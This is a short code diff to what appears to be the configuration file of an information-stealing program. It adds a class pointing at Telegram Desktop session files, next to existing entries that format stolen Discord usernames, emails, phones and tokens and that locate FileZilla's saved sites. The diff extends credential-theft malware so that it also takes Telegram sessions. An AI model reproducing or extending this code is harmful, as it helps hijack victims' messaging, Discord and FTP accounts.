@@ -152,6 +152,11 @@ class DiscordConfig:
     DiscordData = "Username: {0}\nEmail: {1}\nPhone: {2}\nBio: {3}\nToken: {4}\n\n"
 
 
+class TelegramConfig:
+
+    SessionsPath = rf"{user_profile}\AppData\Roaming\Telegram Desktop"
+
+
 class FileZillaConfig:
 
     SitesPath = rf"{user_profile}\AppData\Roaming\FileZilla"
